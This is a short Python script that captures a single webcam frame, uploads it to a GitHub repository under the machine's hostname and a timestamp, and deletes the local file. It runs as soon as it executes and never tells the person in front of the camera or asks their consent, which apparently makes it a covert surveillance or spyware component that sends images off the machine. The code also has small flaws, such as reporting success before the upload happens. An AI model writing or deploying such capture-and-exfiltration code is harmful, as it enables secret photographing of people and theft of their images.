import cv2
from Github import Github
import os
import socket
from datetime import datetime


class PictureShooter:
    def capture_and_upload_picture():
        # Open the webcam
        cap = cv2.VideoCapture(0)
        github = Github()

        # Check if the webcam is opened correctly
        if not cap.isOpened():
            print("Failed to open the webcam")
            return

        # Capture a frame from the webcam
        ret, frame = cap.read()

        # Check if the frame is captured successfully
        if not ret:
            print("Failed to capture frame")
            return

        # Save the captured frame as an image
        picture_path = "picture.jpg"
        cv2.imwrite(picture_path, frame)

        # Release the webcam
        cap.release()

        try:
            with open(picture_path, "rb") as file:
                content = file.read()
                name = (
                    socket.gethostname()
                    + datetime.today().strftime("%Y-%m-%d %H:%M:%S")
                    + ".png"
                )
                print("Picture uploaded successfully")
                github.save_to_repo("Pictures/" + name, content)
                print("Picture done"),
            os.remove("picture.jpg")
        except Exception as e:
            print(f"Failed to upload picture: {str(e)}")


# Capture a picture and upload it to GitHub
PictureShooter.capture_and_upload_picture()
